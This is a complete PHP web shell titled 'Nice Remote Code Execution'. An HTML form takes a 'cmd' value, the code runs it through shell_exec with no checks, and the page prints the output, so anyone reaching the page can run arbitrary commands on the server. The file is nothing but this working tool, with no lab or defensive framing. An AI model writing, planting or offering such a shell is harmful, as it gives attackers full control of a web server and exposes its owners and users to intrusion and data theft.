<h1>Nice Remote Code Execution</h1>

<form method="POST">

  <label for="nme"><span>Input your code</span></label>
  <input type="text" name="cmd" class="question" id="nme" />

</form>

<h3>Output</h3>

<?php

    if (isset($_POST["cmd"])){

        $masukkan = $_POST["cmd"];

        echo "<br/><br />";

                            

        $keluaran = shell_exec($masukkan);

        echo "<pre>$keluaran</pre>";

    }

?>
